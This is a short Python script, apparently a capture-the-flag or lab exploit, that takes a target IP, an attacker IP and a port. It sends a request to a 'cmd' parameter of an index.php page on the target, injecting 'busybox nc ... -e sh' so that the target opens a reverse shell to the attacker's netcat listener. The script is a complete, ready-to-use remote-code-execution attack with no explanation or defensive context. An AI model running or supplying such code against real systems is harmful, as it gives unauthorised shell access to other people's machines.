import requests
import time
import argparse as ag

parse = ag.ArgumentParser()
parse.add_argument('-i', '--ip' ,required=True , help='IP of the target')
parse.add_argument('-a', '--aip' ,required=True , help='Attacker IP')
parse.add_argument('-p', '--port' ,required=True , help='Netcat Port to listen for Reverse Shell')
args = parse.parse_args()

# requesting
def getmeShell(ip,aip,port):

  payload = f'busybox nc {aip} {port} -e sh'
  url = f'http://{ip}/assets/index.php?cmd={payload}'
  print(f'[*]Run \"rlwrap nc -nlvp {port}\"')
  time.sleep(1)
  print('[*]Setting Payload...')
  time.sleep(1)
  print('[*]Enjoy Your Shell')
  time.sleep(0.5)
  
  req = requests.get(url=url)


if __name__ == "__main__" :

  ip = args.ip
  aip = args.aip
  port = args.port
  getmeShell(ip,aip,port)
